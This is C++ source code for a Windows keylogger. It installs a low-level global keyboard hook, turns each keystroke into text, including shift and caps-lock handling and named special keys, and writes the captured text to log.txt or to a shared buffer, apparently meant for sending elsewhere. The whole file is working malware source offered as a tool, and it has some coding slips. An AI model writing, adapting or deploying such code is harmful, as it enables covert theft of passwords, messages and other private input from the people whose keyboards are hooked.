// #include <boost/asio.hpp>
#include <windows.h>
#include <fstream>
#include <ctime>
#include <iostream>
#include <csignal>
#include <mutex>
#include <thread>
#include <condition_variable>

std::ofstream log_fd;
int out_type = 0;
bool capslock, numlock, shift;
DWORD tid;

std::string kdata;
std::condition_variable kdata_cv;
std::mutex kdata_mutex;

void config()
{
    out_type = 1;
}

void write_f(std::string data)
{
    if (log_fd.is_open()) {
        log_fd << data;
    }
}

void write_s(std::string data)
{
    kdata.clear();
    kdata = data;
    kdata_cv.notify_all();
    return;
}

void write(std::string data)
{
    switch (out_type) {
        case 0: write_f(data);
        case 1: write_s(data);
    }
}

void printBanner()
{
    std::string banner =
    "          ####               ###   \n"
    "       #######             ####### \n"
    "      ########            ######## \n"
    "     #######               ########\n"
    "    #############          ########\n"
    "     ################    ##########\n"
    "    ############################## \n"
    "   ##############################  \n"
    "  #############################    \n"
    " ##*.   *########*.    *########   \n"
    "##*.     *######*.      *########  \n"
    "###*.   *########*.    *########## \n"
    "#####*#############*###############\n"
    " ################################# \n"
    "  ################################ \n"
    "   ############################### \n"
    "    ####/ #####/  #####/  ######/  \n"
    "     #/   ###/    ####/    #####/  \n"
    "                                   \n";
    write(banner);
}

LRESULT CALLBACK callbackFunc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION) {
        PKBDLLHOOKSTRUCT keystroke = (PKBDLLHOOKSTRUCT)lParam;
        if (keystroke->vkCode == VK_LSHIFT || keystroke->vkCode == VK_RSHIFT) {
            shift = wParam == WM_KEYDOWN ? true : false;
        } else if (wParam == WM_SYSKEYDOWN || wParam == WM_KEYDOWN) {
            switch (keystroke->vkCode) {
            case 0x41:  write(capslock ? (shift ? "a" : "A" ) : (shift ? "A" : "a")); break;
            case 0x42:  write(capslock ? (shift ? "b" : "B" ) : (shift ? "B" : "b")); break;
            case 0x43:  write(capslock ? (shift ? "c" : "C" ) : (shift ? "C" : "c")); break;
            case 0x44:  write(capslock ? (shift ? "d" : "D" ) : (shift ? "D" : "d")); break;
            case 0x45:  write(capslock ? (shift ? "e" : "E" ) : (shift ? "E" : "e")); break;
            case 0x46:  write(capslock ? (shift ? "f" : "F" ) : (shift ? "F" : "f")); break;
            case 0x47:  write(capslock ? (shift ? "g" : "G" ) : (shift ? "G" : "g")); break;
            case 0x48:  write(capslock ? (shift ? "h" : "H" ) : (shift ? "H" : "h")); break;
            case 0x49:  write(capslock ? (shift ? "i" : "I" ) : (shift ? "I" : "i")); break;
            case 0x4A:  write(capslock ? (shift ? "j" : "J" ) : (shift ? "J" : "j")); break;
            case 0x4B:  write(capslock ? (shift ? "k" : "K" ) : (shift ? "K" : "k")); break;
            case 0x4C:  write(capslock ? (shift ? "l" : "L" ) : (shift ? "L" : "l")); break;
            case 0x4D:  write(capslock ? (shift ? "m" : "M" ) : (shift ? "M" : "m")); break;
            case 0x4E:  write(capslock ? (shift ? "n" : "N" ) : (shift ? "N" : "n")); break;
            case 0x4F:  write(capslock ? (shift ? "o" : "O" ) : (shift ? "O" : "o")); break;
            case 0x50:  write(capslock ? (shift ? "p" : "P" ) : (shift ? "P" : "p")); break;
            case 0x51:  write(capslock ? (shift ? "q" : "Q" ) : (shift ? "Q" : "q")); break;
            case 0x52:  write(capslock ? (shift ? "r" : "R" ) : (shift ? "R" : "r")); break;
            case 0x53:  write(capslock ? (shift ? "s" : "S" ) : (shift ? "S" : "s")); break;
            case 0x54:  write(capslock ? (shift ? "t" : "T" ) : (shift ? "T" : "t")); break;
            case 0x55:  write(capslock ? (shift ? "u" : "U" ) : (shift ? "U" : "u")); break;
            case 0x56:  write(capslock ? (shift ? "v" : "V" ) : (shift ? "V" : "v")); break;
            case 0x57:  write(capslock ? (shift ? "w" : "W" ) : (shift ? "W" : "w")); break;
            case 0x58:  write(capslock ? (shift ? "x" : "X" ) : (shift ? "X" : "x")); break;
            case 0x59:  write(capslock ? (shift ? "y" : "Y" ) : (shift ? "Y" : "y")); break;
            case 0x5A:  write(capslock ? (shift ? "z" : "Z" ) : (shift ? "Z" : "z")); break;
            case 0x30:  write(shift ? ")" : "0");       break;
            case 0x31:  write(shift ? "!" : "1");       break;
            case 0x32:  write(shift ? "@" : "2");       break;
            case 0x33:  write(shift ? "#" : "3");       break;
            case 0x34:  write(shift ? "$" : "4");       break;
            case 0x35:  write(shift ? "%" : "5");       break;
            case 0x36:  write(shift ? "^" : "6");       break;
            case 0x37:  write(shift ? "&" : "7");       break;
            case 0x38:  write(shift ? "*" : "8");       break;
            case 0x39:  write(shift ? "(" : "9");       break;
            case VK_BACK:       write("[backspace]");   break;
            case VK_TAB:        write("[tab]");         break;
            case VK_RETURN:     write("\n");            break;
            case VK_MENU:       write("[alt]");         break;
            case VK_PAUSE:      write("[pause]");       break;
            case VK_CAPITAL:    capslock = !capslock;   break;
            case VK_NUMLOCK:    numlock = !numlock;     break;
            case VK_LCONTROL:   if (wParam == WM_KEYDOWN) write("\n[ctrl]"); break;
            case VK_RCONTROL:   if (wParam == WM_KEYDOWN) write("\n[ctrl]"); break;
            case VK_ESCAPE:     write("[esc]");         break;
            case VK_SPACE:      write(" ");             break;
            case VK_PRIOR:      write("[page up]");     break;
            case VK_NEXT:       write("[page down]");   break;
            case VK_END:        write("[end]");         break;
            case VK_HOME:       write("[home]");        break;
            case VK_LEFT:       write("[left]");        break;
            case VK_RIGHT:      write("[right]");       break;
            case VK_DOWN:       write("[down]");        break;
            case VK_SELECT:     write("[select]");      break;
            case VK_PRINT:      write("[print]");       break;
            case VK_EXECUTE:    write("[execute]");     break;
            case VK_SNAPSHOT:   write("[prt sc]");      break;
            case VK_INSERT:     write("[insert]");      break;
            case VK_DELETE:     write("[delete]");      break;
            case VK_HELP:       write("[help]");        break;
            case VK_LWIN:       write("[lwin key]");    break;
            case VK_RWIN:       write("[rwin key");     break;
            case VK_APPS:       write("[apps]");        break;
            case VK_SLEEP:      write("[sleep]");       break;
            case VK_NUMPAD0:    write("0");             break;
            case VK_NUMPAD1:    write("1");             break;
            case VK_NUMPAD2:    write("2");             break;
            case VK_NUMPAD3:    write("3");             break;
            case VK_NUMPAD4:    write("4");             break;
            case VK_NUMPAD5:    write("5");             break;
            case VK_NUMPAD6:    write("6");             break;
            case VK_NUMPAD7:    write("7");             break;
            case VK_NUMPAD8:    write("8");             break;
            case VK_NUMPAD9:    write("9");             break;
            case VK_MULTIPLY:   write("*");             break;
            case VK_ADD:        write("+");             break;
            case VK_SUBTRACT:   write("-");             break;
            case VK_DECIMAL:    write(",");             break;
            case VK_DIVIDE:     write("/");             break;
            case VK_F1:         write("[F1]");          break;
            case VK_F2:         write("[F2]");          break;
            case VK_F3:         write("[F3]");          break;
            case VK_F4:         write("[F4]");          break;
            case VK_F5:         write("[F5]");          break;
            case VK_F6:         write("[F6]");          break;
            case VK_F7:         write("[F7]");          break;
            case VK_F8:         write("[F8]");          break;
            case VK_F9:         write("[F9]");          break;
            case VK_F10:        write("[F10]");         break;
            case VK_F11:        write("[F11]");         break;
            case VK_F12:        write("[F12]");         break;
            case VK_OEM_1:      write(shift ? ":" : ";"); break;
            case VK_OEM_2:      write(shift ? "?" : "/"); break;
            case VK_OEM_3:      write(shift ? "~" : "`"); break;
            case VK_OEM_4:      write(shift ? "{" : "["); break;
            case VK_OEM_5:      write(shift ? "|" : "\\"); break;
            case VK_OEM_6:      write(shift ? "}" : "]"); break;
            case VK_OEM_7:      write(shift ? "\"" : "'"); break;
            case VK_OEM_PLUS:   write(shift ? "+" : "="); break;
            case VK_OEM_COMMA:  write(shift ? "," : "<"); break;
            case VK_OEM_MINUS:  write(shift ? "_" : "-"); break;
            case VK_OEM_PERIOD: write(shift ? ">" : "."); break;
            default:
                DWORD dWord = keystroke->scanCode << 16;
                dWord += keystroke->flags << 24;
                char unknownkey[16] = "";
                if (GetKeyNameTextA(dWord, unknownkey, sizeof(unknownkey) != 0)) {
                    write(unknownkey);
                }
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void worker()
{
    HHOOK hook = SetWindowsHookExA(WH_KEYBOARD_LL, callbackFunc, NULL, 0);
    if (hook == NULL) {
        std::cerr << "Unable to install hook" << std::endl;
    } else {
        std::cout << "keylogger is running" << std::endl;
        capslock = GetKeyState(VK_CAPITAL);
        numlock = GetKeyState(VK_NUMLOCK);
        MSG msg = {};
        while (GetMessageA(&msg, NULL, 0, 0) > 0) {
            TranslateMessage(&msg);
            DispatchMessageA(&msg);
        }
        if (UnhookWindowsHookEx(hook) == 0) {
            std::cerr << "Unable to uninstall hook" << std::endl;
        }
        CloseHandle(hook);
    }
}

void removeHook(int signum)
{
    if (PostThreadMessageA(tid, WM_QUIT, NULL, NULL) == 0) {
        std::cout << "Unable to send WM_QUIT message to worker" << std::endl;
        exit(EXIT_FAILURE);
    }
}

void createHook()
{
    HANDLE thread_handler = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&worker, NULL, 0, &tid);
    if (thread_handler == NULL) {
        std::cerr << "Unable to create hook thread" << std::endl;
    } else {
        signal(SIGINT, removeHook);
        WaitForSingleObject(thread_handler, INFINITE);
        signal(SIGINT, SIG_DFL);
        CloseHandle(thread_handler);
    }
}

void startLogger()
{
    capslock = numlock = shift = false;
    log_fd.open("log.txt", std::ofstream::out);
    // printBanner();
    createHook();
}